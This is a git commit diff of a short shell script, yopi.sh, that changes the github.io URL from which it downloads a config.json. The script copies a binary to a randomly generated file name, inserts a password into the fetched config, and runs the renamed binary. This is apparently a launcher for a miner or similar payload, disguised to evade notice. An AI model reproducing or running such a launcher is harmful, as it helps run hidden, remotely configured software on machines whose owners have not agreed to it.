63797ad74de22e51c0df8527ce9f767093d28ca8
pzeankto <57797716+pzeankto@users.noreply.github.com>
2019-11-21 23:28:59 +0100

    Update yopi.sh

--- yopi.sh
+++ yopi.sh
@@ -5,7 +5,7 @@ NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
 BB=za$NEW_UUID
 cp oxm $BB
 echo $NN >> $BB
-wget https://pzeankto.github.io/namnam/sumo2.json -O config.json
+wget https://pzeankto.github.io/namnam/arqt.json -O config.json
 sed -i "s/PSPS/$PASS/g" config.json
 chmod +x $BB
 ./$BB
